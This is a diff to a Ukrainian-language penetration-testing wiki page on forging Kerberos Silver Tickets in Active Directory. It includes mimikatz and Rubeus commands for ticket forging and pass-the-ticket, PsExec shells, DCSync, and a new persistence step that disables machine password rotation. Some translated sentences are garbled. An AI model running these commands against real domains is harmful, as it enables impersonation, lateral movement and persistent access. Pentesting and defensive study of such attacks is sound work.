@@ -8,6 +8,10 @@
 
 Атака **Silver Ticket** передбачає експлуатацію сервісних квитків в середовищах Active Directory (AD). Цей метод базується на **отриманні NTLM хешу облікового запису сервісу**, такого як обліковий запис комп'ютера, для підробки квитка служби надання квитків (TGS). З цим підробленим квитком зловмисник може отримати доступ до конкретних сервісів в мережі, **вдаючи з себе будь-якого користувача**, зазвичай намагаючись отримати адміністративні привілеї. Підкреслюється, що використання AES ключів для підробки квитків є більш безпечним і менш помітним.
 
+> [!WARNING]
+> Silver Tickets менш помітні, ніж Golden Tickets, оскільки вони вимагають лише **хеш облікового запису сервісу**, а не облікового запису krbtgt. Однак вони обмежені конкретним сервісом, на який націлені. Більше того, просто вкрасти пароль користувача.
+Більше того, якщо ви зламаєте **пароль облікового запису з SPN**, ви можете використовувати цей пароль для створення Silver Ticket, вдаючи з себе будь-якого користувача для цього сервісу.
+
 Для створення квитків використовуються різні інструменти в залежності від операційної системи:
 
 ### On Linux
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### На Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -28,34 +37,38 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS-сервіс виділяється як загальна ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можуть бути використані для завдань і WMI-запитів.
+CIFS служба виділяється як загальна ціль для доступу до файлової системи жертви, але інші служби, такі як HOST і RPCSS, також можуть бути використані для завдань і WMI запитів.
 
-## Доступні сервіси
+## Доступні служби
 
-| Тип сервісу                                | Сервісні срібні квитки                                                    |
-| ------------------------------------------ | ------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
+| Тип служби                                 | Служба Silver Tickets                                                      |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>В залежності від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>В деяких випадках ви можете просто запитати: WINRM</p> |
-| Заплановані завдання                       | HOST                                                                     |
-| Спільний доступ до файлів Windows, також psexec | CIFS                                                                     |
-| Операції LDAP, включаючи DCSync           | LDAP                                                                     |
-| Інструменти адміністрування віддалених серверів Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
-| Золоті квитки                             | krbtgt                                                                   |
+| Заплановані завдання                       | HOST                                                                      |
+| Спільний доступ до файлів Windows, також psexec | CIFS                                                                      |
+| LDAP операції, включаючи DCSync           | LDAP                                                                      |
+| Інструменти адміністрування Windows Remote Server | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
+| Золоті квитки                              | krbtgt                                                                    |
 
 Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використовуючи параметр:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Ідентифікатори подій срібних квитків
+### Ідентифікатори подій Silver tickets
 
 - 4624: Увійшов до облікового запису
 - 4634: Вийшов з облікового запису
 - 4672: Увійшов адміністратор
 
-## Зловживання сервісними квитками
+## Постійність
 
-У наступних прикладах уявімо, що квиток отримано, підробляючи обліковий запис адміністратора.
+Щоб уникнути зміни паролів на машинах кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або ви можете встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на більше значення, ніж 30 днів, щоб вказати період ротації, коли пароль машини має бути змінений.
+
+## Зловживання квитками служби
+
+У наступних прикладах уявімо, що квиток отримано, імплементуючи обліковий запис адміністратора.
 
 ### CIFS
 
@@ -71,7 +84,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### ХОСТ
+### HOST
 
 З цією дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
 ```bash
@@ -126,14 +139,16 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 ```
 **Дізнайтеся більше про DCSync** на наступній сторінці:
 
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+
 ## Посилання
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{{#ref}}
-dcsync.md
-{{#endref}}
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
